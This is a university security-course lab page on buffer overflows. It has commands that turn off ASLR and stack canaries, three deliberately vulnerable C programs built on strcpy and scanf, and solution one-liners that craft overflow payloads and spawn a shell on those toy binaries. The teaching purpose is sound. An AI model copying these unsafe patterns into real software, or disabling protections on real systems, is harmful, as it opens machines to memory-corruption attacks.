@@ -1,0 +1,393 @@
+    
+    
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+ "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"
+ lang="en" dir="ltr">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <title>
+    Lab 06 - Application Security    [CS Open CourseWare]
+  </title>
+
+  <meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="index,follow"/>
+<meta name="date" content="2016-08-05T14:11:32+0300"/>
+<meta name="keywords" content="isc,labs,06"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="CS Open CourseWare"/>
+<link rel="start" href="../../../courses.1.html"/>
+<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="../../feed.php%3Fmode=list&amp;ns=isc:labs"/>
+<link rel="alternate" type="text/html" title="Plain HTML" href="../../_export/xhtml/isc/labs/06.html"/>
+<link rel="canonical" href="06.html"/>
+<link rel="stylesheet" type="text/css" href="../../lib/exe/css.php%3Ft=arctic&amp;tseed=1476798676.css"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='isc:labs';var JSINFO = {"id":"isc:labs:06","namespace":"isc:labs","isadmin":0,"isauth":0};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../lib/exe/js.php%3Ftseed=1476798676"></script>
+<script type="text/x-mathjax-config">/*<![CDATA[*/MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+        displayMath: [ ["$$","$$"], ["\\[","\\]"] ],
+        processEscapes: true
+    }
+});
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+<script type="text/javascript">/*<![CDATA[*/
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+		  
+/*!]]>*/</script>
+<script type="text/javascript">/*<![CDATA[*/
+var pageTracker = _gat._getTracker("UA-38383934-1");
+pageTracker._initData();
+pageTracker._trackPageview();
+		  
+/*!]]>*/</script>
+
+  <link rel="shortcut icon" href="../../lib/tpl/arctic/images/favicon.ico" />
+
+  
+</head>
+<body>
+<div id="wrapper" class='show'>
+  <div class="dokuwiki">
+
+    
+    <div class="stylehead">
+      <div class="header">
+        <div class="pagename">
+          <a href="../index.html"><img height="70" src="../../res/sigla_cs.png"/> </a>        </div>
+        <div class="logo">
+          <a style="color: #AAA !important;" href="../../systems/index.html"/><img height="70" src="../../res/systems.png" name="dokuwiki__top"/></a>        </div>
+      </div>
+    
+       
+      <div class="breadcrumbs">
+              </div>
+      
+            </div>
+
+                  <div class="bar" id="bar__top">
+        <div class="bar-left">
+                  </div>
+        <div class="bar-right">
+          <a href="06%3Fdo=recent.html"  class="action recent" accesskey="r" rel="nofollow" title="Recent changes [R]">Recent changes</a><a href="06%3Fdo=login&amp;sectok=f62420cf5b01253da4b50505d148181b.html"  class="action login" rel="nofollow" title="Login">Login</a>        </div>
+    </div>
+        
+    
+    
+    
+              <div class="left_page">
+          
+<h2 class="sectionedit1" id="lab_06_-_application_security">Lab 06 - Application Security</h2>
+<div class="level2">
+
+<p>
+Disable ASLR 
+</p>
+<pre class="code"> sudo bash -c &#039;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#039;
+ </pre>
+
+<p>
+Enable ASLR 
+</p>
+<pre class="code"> sudo bash -c &#039;echo 2 &gt; /proc/sys/kernel/randomize_va_space&#039;</pre>
+
+<p>
+Disable canaries:
+</p>
+<pre class="code"> gcc overflow.c -o overflow -fno-stack-protector
+ 
+ </pre>
+
+</div>
+
+<h2 class="sectionedit2" id="resources">Resources</h2>
+<div class="level2">
+<ul>
+<li class="level1"><div class="li"><a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/" class="urlextern" title="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/"  rel="nofollow">Buffer overflow explained</a></div>
+</li>
+<li class="level1"><div class="li"><a href="https://dhavalkapil.com/blogs/Shellcode-Injection/" class="urlextern" title="https://dhavalkapil.com/blogs/Shellcode-Injection/"  rel="nofollow">Shellcode explained</a></div>
+</li>
+</ul>
+
+</div>
+
+<h2 class="sectionedit3" id="overview">Overview</h2>
+<div class="level2">
+
+<p>
+<a href="../../lib/exe/fetch.php%3Fhash=a95ad7&amp;media=http%253A%252F%252Fi.imgur.com%252FmK1nsNl.png" class="media" title="http://i.imgur.com/mK1nsNl.png"><img src="../../lib/exe/fetch.php%3Fhash=a95ad7&amp;media=http%253A%252F%252Fi.imgur.com%252FmK1nsNl.png" class="media" alt="" /></a>
+</p>
+
+<p>
+A buffer overflow occurs when data written to a buffer overruns its boundary and overwrites adjacent memory locations, due to insufficient bounds checking.
+</p>
+
+</div>
+
+<h2 class="sectionedit4" id="exercises">Exercises</h2>
+<div class="level2">
+
+</div>
+
+<h4 id="simple_buffer_overflow">1. Simple buffer overflow</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"><a href="https://drive.google.com/open?id=0B_sFoQMHYxA4SlNsakZCRFcwYjQ" class="urlextern" title="https://drive.google.com/open?id=0B_sFoQMHYxA4SlNsakZCRFcwYjQ"  rel="nofollow">bufferoverflow1</a></div>
+</li>
+</ul>
+<pre class="code">
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+
+void wanted(){
+	puts(&quot;Well done!&quot;);
+}
+
+void copy(char *arg){
+	char buf[5];
+  	strcpy(buf, arg);
+}
+
+int main(int argc, char **argv) {
+	copy(argv[1]); 
+  	return 0;
+}
+</pre>
+
+</div>
+
+<h4 id="getting_shell">2. Getting shell</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"><a href="https://drive.google.com/open?id=0B_sFoQMHYxA4WFVnMjNpRF96V0U" class="urlextern" title="https://drive.google.com/open?id=0B_sFoQMHYxA4WFVnMjNpRF96V0U"  rel="nofollow">bufferoverflow2</a></div>
+</li>
+</ul>
+<pre class="code">
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+
+void wanted(){
+	execve(&quot;/bin/sh&quot;, NULL, NULL);
+}
+
+void function() {
+   char buffer[10];
+   scanf(&quot;%s&quot;, buffer);
+}
+
+int main() {
+  function();
+  return 0;
+}
+</pre>
+
+</div>
+
+<h4 id="shellcode">3. Shellcode</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"><a href="https://drive.google.com/open?id=0B_sFoQMHYxA4NDhzaUFVV3kwZzQ" class="urlextern" title="https://drive.google.com/open?id=0B_sFoQMHYxA4NDhzaUFVV3kwZzQ"  rel="nofollow">shellcode</a></div>
+</li>
+</ul>
+<pre class="code">
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+
+void vuln(char *str) {
+   char buffer[50];
+   strcpy(buffer,str);
+}
+
+int main() {
+  char buf[256];
+  fgets(buf, 256, stdin);
+  vuln(buf);
+  
+  return 0;
+}
+</pre>
+
+</div>
+
+<h3 class="sectionedit5" id="solutions">Solutions:</h3>
+<div class="level3">
+
+</div>
+
+<h5 id="simple_buffer_overflow1">1. Simple buffer overflow</h5>
+<div class="level5">
+
+<p>
+ python -c &#039;print “A”*17 + “\x3b\x84\x04\x08”&#039; &gt; payload1
+ ./bufov1 `cat payload`
+</p>
+
+</div>
+
+<h5 id="getting_shell1">2. Getting shell</h5>
+<div class="level5">
+
+<p>
+ python -c &#039;print “A”*22 + “\x6b\x84\x04\x08”&#039; &gt; payload2
+ cat ./payload2 - | ./bufov2
+</p>
+
+</div>
+
+<h5 id="shellcode1">3. Shellcode</h5>
+<div class="level5">
+
+</div>
+
+        </div>
+        <div class="right_sidebar">
+          <form action="../../start.html" accept-charset="utf-8" class="search" id="dw__search" method="get"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="Search" class="button" title="Search" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>          <div class="namespace_sidebar sidebar_box">
+
+<h1 class="sectionedit1" id="lectures">Lectures</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_159377391558355a9c99b79" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../lectures/01.html" class="wikilink1" title="isc:lectures:01">Lecture 01 - Introduction</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/02.html" class="wikilink1" title="isc:lectures:02">Lecture 02 - Access control</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/03.html" class="wikilink1" title="isc:lectures:03">Lecture 03 - Hardware Security</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/04.html" class="wikilink1" title="isc:lectures:04">Lecture 04 - Cryptography</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/05.html" class="wikilink1" title="isc:lectures:05">Lecture 05 - Operating System Security</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/06.html" class="wikilink1" title="isc:lectures:06">Lecture 06 - Application Security</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/07.html" class="wikilink1" title="isc:lectures:07">Lecture 07 - Network Security</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/08.html" class="wikilink1" title="isc:lectures:08">Lecture 08 - Web Security</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/09.html" class="wikilink1" title="isc:lectures:09">Lecture 09 - Forensics</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/10.html" class="wikilink1" title="isc:lectures:10">Lecture 10 - Usable Security</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT1 SECTION "Lectures" [1-52] -->
+<h1 class="sectionedit2" id="labs">Labs</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_164155184658355a9c9bab7" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="01.html" class="wikilink1" title="isc:labs:01">Lab 01  - Introduction</a></div></li>
+<li class="level1"><div class="li"><a href="02.html" class="wikilink1" title="isc:labs:02">Lab 02 - Access control</a></div></li>
+<li class="level1"><div class="li"><a href="03.html" class="wikilink1" title="isc:labs:03">Lab 03 - Hardware Security</a></div></li>
+<li class="level1"><div class="li"><a href="04.html" class="wikilink1" title="isc:labs:04">Lab 04 - Cryptography</a></div></li>
+<li class="level1"><div class="li"><a href="05.html" class="wikilink1" title="isc:labs:05">Lab 05 - Operating System Security</a></div></li>
+<li class="level1"><div class="li"><span class="curid"><a href="06.html" class="wikilink1" title="isc:labs:06">Lab 06 - Application Security</a></span></div></li>
+<li class="level1"><div class="li"><a href="07.html" class="wikilink1" title="isc:labs:07">Lab 07 - Network Security</a></div></li>
+<li class="level1"><div class="li"><a href="08.html" class="wikilink1" title="isc:labs:08">Lab 08 - Web Security</a></div></li>
+<li class="level1"><div class="li"><a href="09.html" class="wikilink1" title="isc:labs:09">Lab 09 - Forensics</a></div></li>
+<li class="level1"><div class="li"><a href="10.html" class="wikilink1" title="isc:labs:10">Lab 10 - Usable Security</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT2 SECTION "Labs" [53-96] -->
+<h1 class="sectionedit3" id="assignments">Assignments</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_44493107358355a9c9d9f4" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../assignments/1.html" class="wikilink1" title="isc:assignments:1">Homework 1</a></div></li>
+<li class="level1"><div class="li"><a href="../assignments/2.html" class="wikilink1" title="isc:assignments:2">Homework 2</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT3 SECTION "Assignments" [97-156] -->
+<h1 class="sectionedit4" id="support">Support</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_68334656958355a9c9f935" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../info/resources.html" class="wikilink1" title="isc:info:resources">Useful resources</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT4 SECTION "Support" [157-] -->
+</div>
+<div class="toc_sidebar sidebar_box">
+<!-- TOC START -->
+<div id="sb__right__dw__toc">
+<h3 class="toggle">Table of Contents</h3>
+<div>
+
+<ul class="toc">
+<li class="level2"><div class="li"><a href="06.html#lab_06_-_application_security">Lab 06 - Application Security</a></div></li>
+<li class="level2"><div class="li"><a href="06.html#resources">Resources</a></div></li>
+<li class="level2"><div class="li"><a href="06.html#overview">Overview</a></div></li>
+<li class="level2"><div class="li"><a href="06.html#exercises">Exercises</a></div>
+<ul class="toc">
+<li class="clear">
+<ul class="toc">
+<li class="level4"><div class="li"><a href="06.html#simple_buffer_overflow">1. Simple buffer overflow</a></div></li>
+<li class="level4"><div class="li"><a href="06.html#getting_shell">2. Getting shell</a></div></li>
+<li class="level4"><div class="li"><a href="06.html#shellcode">3. Shellcode</a></div></li>
+</ul>
+</li>
+<li class="level3"><div class="li"><a href="06.html#solutions">Solutions:</a></div></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+</div>
+        </div>
+      
+    
+      <div class="stylefoot">
+        <div class="meta">
+          <div class="user">
+                    </div>
+          <div class="doc">
+          isc/labs/06.txt · Last modified: 2016/08/05 14:11 by filip.munteanu          </div>
+        </div>
+      </div>
+
+    <div class="clearer"></div>
+
+    
+                <div class="bar" id="bar__bottom">
+      <div class="bar-left">
+              </div>
+      <div class="bar-right">
+        <a href="06%3Fdo=media&amp;ns=isc%253Alabs.html"  class="action media" rel="nofollow" title="Media Manager">Media Manager</a><a href="06.html#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="Back to top [T]">Back to top</a>      </div>
+    </div>
+    <div class="clearer"></div>
+            
+    <div align="center" class="footerinc">
+  <div class="license"><a href="http://creativecommons.org/licenses/by-sa/3.0/" rel="license"><img src="../../lib/images/license/button/cc-by-sa.png" alt="CC Attribution-Share Alike 3.0 Unported" /></a></div>
+  <a target="_blank" href="http://www.chimeric.de" title="www.chimeric.de"><img src="../../lib/tpl/arctic/images/button-chimeric-de.png" width="80" height="15" alt="www.chimeric.de" border="0" /></a>
+
+  <a target="_blank" href="http://jigsaw.w3.org/css-validator/check/referer" title="Valid CSS"><img src="../../lib/tpl/arctic/images/button-css.png" width="80" height="15" alt="Valid CSS" border="0" /></a>
+
+  <a target="_blank" href="http://wiki.splitbrain.org/wiki:dokuwiki" title="Driven by DokuWiki"><img src="../../lib/tpl/arctic/images/button-dw.png" width="80" height="15" alt="Driven by DokuWiki" border="0" /></a>
+
+  <a target="_blank" href="http://www.firefox-browser.de" title="do yourself a favour and use a real browser - get firefox"><img src="../../lib/tpl/arctic/images/button-firefox.png" width="80" height="15" alt="do yourself a favour and use a real browser - get firefox!!" border="0" /></a>
+  
+  <a target="_blank" href="../../feed.php" title="Recent changes RSS feed"><img src="../../lib/tpl/arctic/images/button-rss.png" width="80" height="15" alt="Recent changes RSS feed" border="0" /></a>
+
+  <a target="_blank" href="http://validator.w3.org/check/referer" title="Valid XHTML 1.0"><img src="../../lib/tpl/arctic/images/button-xhtml.png" width="80" height="15" alt="Valid XHTML 1.0" border="0" /></a>
+</div>
+
+  </div>
+</div>
+
+<div class="no"><img src="../../lib/exe/indexer.php%3Fid=isc%253Alabs%253A06&amp;1479891612" width="2" height="1" alt="" /></div>
+</body>
+</html>
